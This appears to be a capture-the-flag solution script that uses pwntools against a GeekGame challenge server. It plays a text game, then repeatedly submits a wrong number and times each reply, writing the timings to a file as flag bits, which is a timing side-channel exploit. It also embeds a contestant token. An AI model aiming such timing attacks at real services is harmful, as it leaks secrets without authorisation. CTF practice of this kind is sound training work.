from pwn import *
import time


p = remote("prob16.geekgame.pku.edu.cn", 10016)
p.recvuntil(b"token: ")
p.sendline(b"56:MEUCIB95OPBgEJNiIhO7mQhh_9Jshx-8jiz4o5J6GXHsXJwwAiEAvfambFs2zMUIA1ASGa7q5f6OjZNh3r3RSdY5czagnUc=")
p.recvuntil(b"[...]: ")
p.sendline(b"newgame")
x = p.recvuntil(b"[...]: ")
p.sendline(b"RayW")
p.recvuntil(b"(y/n) ")
p.sendline(b"y")
p.recvuntil(b"[RayW]: ")

p.sendline(b"n")
p.recvuntil(b"[RayW]: ")
p.sendline(b"n")
p.recvuntil(b"[RayW]: ")
p.sendline(b"w")
p.recvuntil(b"[RayW]: ")
p.sendline(b"w")
p.recvuntil(b"[RayW]: ")
p.sendline(b"s")
p.recvuntil(b"[RayW]: ")
p.sendline(b"getflag")
p.recvuntil(b"number): ")

cnt = 0
with open('flag2.txt', 'w') as f:
    pass

while True:
    cnt += 1
    starttime = time.time()
    p.sendline(b"114514")
    p.recvuntil(b'Wrong\n', drop=True)

    endtime = time.time()
    t = endtime - starttime
    with open('flag2.txt', 'a') as f:
        f.write('0' if t < 0.5 else '1')

    print(f'Try {cnt}, time consumption {t}')

    p.recvuntil(b"number): ")
